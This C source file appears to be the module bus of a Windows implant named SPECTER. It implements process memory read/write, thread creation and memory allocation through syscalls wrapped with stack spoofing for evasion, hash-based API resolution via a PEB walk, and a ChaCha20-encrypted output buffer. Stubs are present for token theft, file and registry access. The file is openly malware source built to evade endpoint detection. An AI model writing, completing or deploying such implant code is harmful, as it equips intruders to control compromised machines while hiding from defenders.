/**
 * SPECTER Implant — Module Bus API Implementation
 *
 * All module operations route through this bus.  Each API function
 * calls the evasion engine which wraps syscalls with stack spoofing.
 * The output ring buffer uses ChaCha20 encryption at rest.
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#include "bus.h"
#include "peb.h"
#include "sleep.h"

/* ------------------------------------------------------------------ */
/*  Static bus context storage                                         */
/* ------------------------------------------------------------------ */

static BUS_CONTEXT g_bus_ctx;

/* ------------------------------------------------------------------ */
/*  Forward declarations for bus API implementations                   */
/* ------------------------------------------------------------------ */

static PVOID     bus_mem_alloc(SIZE_T size, DWORD perms);
static BOOL      bus_mem_free(PVOID ptr);
static BOOL      bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms);

static HANDLE    bus_net_connect(const char *addr, DWORD port, DWORD proto);
static BOOL      bus_net_send(HANDLE handle, const BYTE *data, DWORD len);
static DWORD     bus_net_recv(HANDLE handle, BYTE *buf, DWORD len);
static BOOL      bus_net_close(HANDLE handle);

static HANDLE    bus_proc_open(DWORD pid, DWORD access);
static BOOL      bus_proc_read(HANDLE handle, PVOID addr, BYTE *buf, DWORD len);
static BOOL      bus_proc_write(HANDLE handle, PVOID addr, const BYTE *data, DWORD len);
static BOOL      bus_proc_close(HANDLE handle);

static HANDLE    bus_thread_create(PVOID func, PVOID param, BOOL suspended);
static BOOL      bus_thread_resume(HANDLE handle);
static BOOL      bus_thread_terminate(HANDLE handle);

static HANDLE    bus_token_steal(DWORD pid);
static BOOL      bus_token_impersonate(HANDLE handle);
static BOOL      bus_token_revert(void);
static HANDLE    bus_token_make(const char *user, const char *pass, const char *domain);

static DWORD     bus_file_read(const char *path, BYTE *buf, DWORD len);
static BOOL      bus_file_write(const char *path, const BYTE *data, DWORD len);
static BOOL      bus_file_delete(const char *path);
static PVOID     bus_file_list(const char *path);

static DWORD     bus_reg_read(DWORD hive, const char *path, const char *value);
static BOOL      bus_reg_write(DWORD hive, const char *path, const char *value,
                               const BYTE *data, DWORD type);
static BOOL      bus_reg_delete(DWORD hive, const char *path, const char *value);

static BOOL      bus_output(const BYTE *data, DWORD len, DWORD type);
static PVOID     bus_resolve(const char *dll_name, const char *func_name);
static void      bus_log(DWORD level, const char *msg);

/* ------------------------------------------------------------------ */
/*  Helper: get evasion context from the bus context                   */
/* ------------------------------------------------------------------ */

static EVASION_CONTEXT *bus_get_evasion(void) {
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (!ctx)
        return NULL;
    return (EVASION_CONTEXT *)ctx->evasion_ctx;
}

/* ------------------------------------------------------------------ */
/*  Output ring buffer — encrypted circular buffer                     */
/* ------------------------------------------------------------------ */

/**
 * Generate a random encryption key for the output ring buffer.
 * Uses RDTSC-based PRNG as entropy source (same pattern as memguard).
 */
static void output_generate_key(OUTPUT_RING *ring) {
    /* RDTSC-based seed for PRNG */
    DWORD seed;
    __asm__ volatile ("rdtsc" : "=a"(seed) : : "edx");

    /* Simple LCG PRNG to fill key and nonce */
    DWORD state = seed;
    for (int i = 0; i < 32; i++) {
        state = state * 1103515245 + 12345;
        ring->enc_key[i] = (BYTE)(state >> 16);
    }
    for (int i = 0; i < 12; i++) {
        state = state * 1103515245 + 12345;
        ring->enc_nonce[i] = (BYTE)(state >> 16);
    }
}

void output_reset(OUTPUT_RING *ring) {
    if (!ring)
        return;
    spec_memset(ring->data, 0, BUS_OUTPUT_RING_SIZE);
    ring->head = 0;
    ring->tail = 0;
    ring->count = 0;
    ring->encrypted = FALSE;
    output_generate_key(ring);
}

DWORD output_available(const OUTPUT_RING *ring) {
    if (!ring)
        return 0;
    return ring->count;
}

/**
 * Output entry header written before each output chunk in the ring.
 * Allows drain to reconstruct individual output messages.
 */
typedef struct _OUTPUT_ENTRY_HDR {
    DWORD len;    /* Payload length */
    DWORD type;   /* OUTPUT_TEXT / OUTPUT_BINARY / OUTPUT_ERROR */
} OUTPUT_ENTRY_HDR;

BOOL output_write(OUTPUT_RING *ring, const BYTE *data, DWORD len, DWORD type) {
    if (!ring || !data || len == 0)
        return FALSE;

    /* Check total size: header + data */
    DWORD total = sizeof(OUTPUT_ENTRY_HDR) + len;
    if (total > BUS_OUTPUT_RING_SIZE - ring->count)
        return FALSE;  /* Not enough space */

    if (len > BUS_OUTPUT_ENTRY_MAX)
        return FALSE;  /* Single entry too large */

    /* Build header */
    OUTPUT_ENTRY_HDR hdr;
    hdr.len = len;
    hdr.type = type;

    /* Encrypt the header + data with ChaCha20 before writing to ring.
     * Use the current head position as the counter to get unique
     * keystream for each write. */
    BYTE enc_buf[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
    BYTE plain_buf[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];

    spec_memcpy(plain_buf, &hdr, sizeof(OUTPUT_ENTRY_HDR));
    spec_memcpy(plain_buf + sizeof(OUTPUT_ENTRY_HDR), data, len);

    spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                          ring->head / CHACHA20_BLOCK_SIZE,
                          plain_buf, total, enc_buf);

    /* Write encrypted bytes to ring buffer (wrapping) */
    for (DWORD i = 0; i < total; i++) {
        ring->data[(ring->head + i) % BUS_OUTPUT_RING_SIZE] = enc_buf[i];
    }
    ring->head = (ring->head + total) % BUS_OUTPUT_RING_SIZE;
    ring->count += total;
    ring->encrypted = TRUE;

    /* Zero plaintext from stack */
    spec_memset(plain_buf, 0, total);

    return TRUE;
}

DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len) {
    if (!ring || !dest || dest_len == 0 || ring->count == 0)
        return 0;

    DWORD drained = 0;

    while (ring->count >= sizeof(OUTPUT_ENTRY_HDR)) {
        /* Read encrypted header from ring */
        BYTE enc_hdr_buf[sizeof(OUTPUT_ENTRY_HDR)];
        for (DWORD i = 0; i < sizeof(OUTPUT_ENTRY_HDR); i++) {
            enc_hdr_buf[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
        }

        /* Decrypt header */
        OUTPUT_ENTRY_HDR hdr;
        spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                              ring->tail / CHACHA20_BLOCK_SIZE,
                              enc_hdr_buf, sizeof(OUTPUT_ENTRY_HDR),
                              (BYTE *)&hdr);

        DWORD total = sizeof(OUTPUT_ENTRY_HDR) + hdr.len;

        /* Sanity checks */
        if (hdr.len > BUS_OUTPUT_ENTRY_MAX || total > ring->count)
            break;

        /* Check if dest has room for the payload */
        if (drained + hdr.len > dest_len)
            break;

        /* Read full encrypted entry */
        BYTE enc_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
        for (DWORD i = 0; i < total; i++) {
            enc_entry[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
        }

        /* Decrypt full entry */
        BYTE plain_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
        spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                              ring->tail / CHACHA20_BLOCK_SIZE,
                              enc_entry, total, plain_entry);

        /* Copy payload to dest (skip header) */
        spec_memcpy(dest + drained, plain_entry + sizeof(OUTPUT_ENTRY_HDR), hdr.len);
        drained += hdr.len;

        /* Zero ring region */
        for (DWORD i = 0; i < total; i++) {
            ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE] = 0;
        }

        ring->tail = (ring->tail + total) % BUS_OUTPUT_RING_SIZE;
        ring->count -= total;

        /* Zero plaintext from stack */
        spec_memset(plain_entry, 0, total);
    }

    if (ring->count == 0)
        ring->encrypted = FALSE;

    return drained;
}

/* ------------------------------------------------------------------ */
/*  bus_init — populate function table, init output ring               */
/* ------------------------------------------------------------------ */

NTSTATUS bus_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    spec_memset(&g_bus_ctx, 0, sizeof(BUS_CONTEXT));
    g_bus_ctx.implant_ctx = ctx;

    /* Populate the API function table */
    MODULE_BUS_API *api = &g_bus_ctx.api;

    api->mem_alloc          = bus_mem_alloc;
    api->mem_free           = bus_mem_free;
    api->mem_protect        = bus_mem_protect;

    api->net_connect        = bus_net_connect;
    api->net_send           = bus_net_send;
    api->net_recv           = bus_net_recv;
    api->net_close          = bus_net_close;

    api->proc_open          = bus_proc_open;
    api->proc_read          = bus_proc_read;
    api->proc_write         = bus_proc_write;
    api->proc_close         = bus_proc_close;

    api->thread_create      = bus_thread_create;
    api->thread_resume      = bus_thread_resume;
    api->thread_terminate   = bus_thread_terminate;

    api->token_steal        = bus_token_steal;
    api->token_impersonate  = bus_token_impersonate;
    api->token_revert       = bus_token_revert;
    api->token_make         = bus_token_make;

    api->file_read          = bus_file_read;
    api->file_write         = bus_file_write;
    api->file_delete        = bus_file_delete;
    api->file_list          = bus_file_list;

    api->reg_read           = bus_reg_read;
    api->reg_write          = bus_reg_write;
    api->reg_delete         = bus_reg_delete;

    api->output             = bus_output;
    api->resolve            = bus_resolve;
    api->log                = bus_log;

    /* Initialize the encrypted output ring buffer */
    output_reset(&g_bus_ctx.output_ring);

    /* Store bus context in implant context */
    ctx->module_bus = &g_bus_ctx;
    g_bus_ctx.initialized = TRUE;

    return STATUS_SUCCESS;
}

MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx) {
    if (!bctx || !bctx->initialized)
        return NULL;
    return &bctx->api;
}

/* ------------------------------------------------------------------ */
/*  Memory API implementations                                         */
/* ------------------------------------------------------------------ */

static PVOID bus_mem_alloc(SIZE_T size, DWORD perms) {
    PVOID base = NULL;
    SIZE_T alloc_size = size;
    HANDLE process = (HANDLE)-1;  /* NtCurrentProcess */

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTALLOCATEVIRTUALMEMORY,
        process, &base, (ULONG_PTR)0, &alloc_size,
        (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)perms);

    if (!NT_SUCCESS(status))
        return NULL;

    /* Track allocation for sleep-time encryption */
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (ctx && ctx->sleep_ctx)
        sleep_track_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, base, alloc_size);

    return base;
}

static BOOL bus_mem_free(PVOID ptr) {
    if (!ptr)
        return FALSE;

    /* Untrack from sleep heap list */
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (ctx && ctx->sleep_ctx)
        sleep_untrack_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, ptr);

    SIZE_T size = 0;
    HANDLE process = (HANDLE)-1;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTFREEVIRTUALMEMORY,
        process, &ptr, &size, (ULONG)MEM_RELEASE);

    return NT_SUCCESS(status);
}

static BOOL bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms) {
    if (!ptr)
        return FALSE;

    ULONG old_protect;
    HANDLE process = (HANDLE)-1;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTPROTECTVIRTUALMEMORY,
        process, &ptr, &size, (ULONG)perms, &old_protect);

    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Network API implementations (stubs — route through comms engine)   */
/* ------------------------------------------------------------------ */

static HANDLE bus_net_connect(const char *addr, DWORD port, DWORD proto) {
    (void)addr; (void)port; (void)proto;
    /* TODO: route through comms engine socket layer */
    return INVALID_HANDLE_VALUE;
}

static BOOL bus_net_send(HANDLE handle, const BYTE *data, DWORD len) {
    (void)handle; (void)data; (void)len;
    return FALSE;
}

static DWORD bus_net_recv(HANDLE handle, BYTE *buf, DWORD len) {
    (void)handle; (void)buf; (void)len;
    return 0;
}

static BOOL bus_net_close(HANDLE handle) {
    (void)handle;
    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  Process API implementations                                        */
/* ------------------------------------------------------------------ */

static HANDLE bus_proc_open(DWORD pid, DWORD access) {
    HANDLE process = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    spec_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    spec_memset(&cid, 0, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENPROCESS,
        &process, (ULONG)access, &oa, &cid);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return process;
}

static BOOL bus_proc_read(HANDLE handle, PVOID addr, BYTE *buf, DWORD len) {
    SIZE_T bytes_read = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTREADVIRTUALMEMORY,
        handle, addr, buf, (SIZE_T)len, &bytes_read);

    return NT_SUCCESS(status);
}

static BOOL bus_proc_write(HANDLE handle, PVOID addr, const BYTE *data, DWORD len) {
    SIZE_T bytes_written = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTWRITEVIRTUALMEMORY,
        handle, addr, (PVOID)data, (SIZE_T)len, &bytes_written);

    return NT_SUCCESS(status);
}

static BOOL bus_proc_close(HANDLE handle) {
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCLOSE, handle);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Thread API implementations                                         */
/* ------------------------------------------------------------------ */

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED  0x00000001

static HANDLE bus_thread_create(PVOID func, PVOID param, BOOL suspended) {
    HANDLE thread = NULL;
    ULONG flags = suspended ? THREAD_CREATE_FLAGS_CREATE_SUSPENDED : 0;

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATETHREADEX,
        &thread, (ULONG)0x1FFFFF, /* THREAD_ALL_ACCESS */
        NULL,                      /* OBJECT_ATTRIBUTES */
        (HANDLE)-1,                /* NtCurrentProcess  */
        func, param, flags,
        (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return thread;
}

static BOOL bus_thread_resume(HANDLE handle) {
    /* NtResumeThread not in current syscall table — use
     * NtSetInformationThread to query/resume is less direct.
     * For now, stub out. Full implementation requires adding
     * NtResumeThread hash to the syscall table. */
    (void)handle;
    return FALSE;
}

static BOOL bus_thread_terminate(HANDLE handle) {
    /* Close the thread handle — actual termination via
     * NtTerminateThread would need to be added to syscall table */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCLOSE, handle);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Token API implementations (stubs — requires additional NT APIs)    */
/* ------------------------------------------------------------------ */

static HANDLE bus_token_steal(DWORD pid) {
    (void)pid;
    /* TODO: NtOpenProcessToken + NtDuplicateToken */
    return INVALID_HANDLE_VALUE;
}

static BOOL bus_token_impersonate(HANDLE handle) {
    (void)handle;
    /* TODO: NtSetInformationThread(ThreadImpersonationToken) */
    return FALSE;
}

static BOOL bus_token_revert(void) {
    /* TODO: NtSetInformationThread(ThreadImpersonationToken, NULL) */
    return FALSE;
}

static HANDLE bus_token_make(const char *user, const char *pass, const char *domain) {
    (void)user; (void)pass; (void)domain;
    /* TODO: route through Win32 LogonUserW or NtCreateToken */
    return INVALID_HANDLE_VALUE;
}

/* ------------------------------------------------------------------ */
/*  File API implementations (stubs — route through NtCreateFile)      */
/* ------------------------------------------------------------------ */

static DWORD bus_file_read(const char *path, BYTE *buf, DWORD len) {
    (void)path; (void)buf; (void)len;
    /* TODO: NtCreateFile + NtReadFile */
    return 0;
}

static BOOL bus_file_write(const char *path, const BYTE *data, DWORD len) {
    (void)path; (void)data; (void)len;
    /* TODO: NtCreateFile + NtWriteFile */
    return FALSE;
}

static BOOL bus_file_delete(const char *path) {
    (void)path;
    /* TODO: NtCreateFile with FILE_DELETE_ON_CLOSE */
    return FALSE;
}

static PVOID bus_file_list(const char *path) {
    (void)path;
    /* TODO: NtQueryDirectoryFile */
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Registry API implementations (stubs — route through NtOpenKey)     */
/* ------------------------------------------------------------------ */

static DWORD bus_reg_read(DWORD hive, const char *path, const char *value) {
    (void)hive; (void)path; (void)value;
    /* TODO: NtOpenKey + NtQueryValueKey */
    return 0;
}

static BOOL bus_reg_write(DWORD hive, const char *path, const char *value,
                          const BYTE *data, DWORD type) {
    (void)hive; (void)path; (void)value; (void)data; (void)type;
    /* TODO: NtOpenKey + NtSetValueKey */
    return FALSE;
}

static BOOL bus_reg_delete(DWORD hive, const char *path, const char *value) {
    (void)hive; (void)path; (void)value;
    /* TODO: NtOpenKey + NtDeleteValueKey */
    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  Output — write module results to encrypted ring buffer             */
/* ------------------------------------------------------------------ */

static BOOL bus_output(const BYTE *data, DWORD len, DWORD type) {
    return output_write(&g_bus_ctx.output_ring, data, len, type);
}

/* ------------------------------------------------------------------ */
/*  Resolve — get a clean function pointer via PEB walk                */
/* ------------------------------------------------------------------ */

static PVOID bus_resolve(const char *dll_name, const char *func_name) {
    if (!dll_name || !func_name)
        return NULL;

    DWORD mod_hash = spec_djb2_hash(dll_name);
    DWORD func_hash = spec_djb2_hash(func_name);

    PVOID module_base = find_module_by_hash(mod_hash);
    if (!module_base)
        return NULL;

    return find_export_by_hash(module_base, func_hash);
}

/* ------------------------------------------------------------------ */
/*  Logging — write log entries as OUTPUT_TEXT to ring buffer           */
/* ------------------------------------------------------------------ */

static void bus_log(DWORD level, const char *msg) {
    if (!msg)
        return;

    /* Format: [LEVEL] message */
    static const char *prefixes[] = { "[DBG] ", "[INF] ", "[WRN] ", "[ERR] " };
    const char *prefix = (level <= LOG_ERROR) ? prefixes[level] : prefixes[LOG_INFO];

    DWORD prefix_len = (DWORD)spec_strlen(prefix);
    DWORD msg_len = (DWORD)spec_strlen(msg);
    DWORD total = prefix_len + msg_len;

    if (total > BUS_OUTPUT_ENTRY_MAX)
        total = BUS_OUTPUT_ENTRY_MAX;

    BYTE buf[BUS_OUTPUT_ENTRY_MAX];
    spec_memcpy(buf, prefix, prefix_len);

    DWORD copy_len = total - prefix_len;
    spec_memcpy(buf + prefix_len, msg, copy_len);

    output_write(&g_bus_ctx.output_ring, buf, total, OUTPUT_TEXT);
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void bus_test_set_ring_key(OUTPUT_RING *ring, const BYTE key[32],
                           const BYTE nonce[12]) {
    if (!ring)
        return;
    spec_memcpy(ring->enc_key, key, 32);
    spec_memcpy(ring->enc_nonce, nonce, 12);
}
#endif
